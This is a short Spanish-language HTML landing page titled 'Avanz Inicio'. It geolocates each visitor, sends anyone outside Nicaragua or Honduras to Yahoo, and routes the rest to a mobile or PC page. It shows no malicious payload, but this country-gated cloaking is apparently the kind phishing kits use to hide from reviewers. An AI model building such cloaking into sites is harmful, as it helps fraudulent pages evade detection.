<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz Inicio</title>
    <script>
        async function redireccionar() {
            try {
                // Obtener la ubicación del usuario
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                const paisPermitido = ["NI", "HN"]; // Nicaragua y Honduras

                // Si el usuario no está en Nicaragua o Honduras, lo redirige a Yahoo
                if (!paisPermitido.includes(data.country_code)) {
                    window.location.href = "https://www.yahoo.com";
                    return; // Detener la ejecución del resto del código
                }

                // Si está permitido, verificar si es móvil o PC
                var esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (esMovil) {
                    window.location.href = "indexmovil.html"; // URL de la versión móvil
                } else {
                    window.location.href = "pcindex.html"; // URL de la versión PC
                }
            } catch (error) {
                console.error("Error al obtener la ubicación:", error);
                window.location.href = "https://www.yahoo.com"; // Si hay error, redirigir a Yahoo
            }
        }
    </script>
</head>
<body onload="redireccionar()">
</body>
</html>
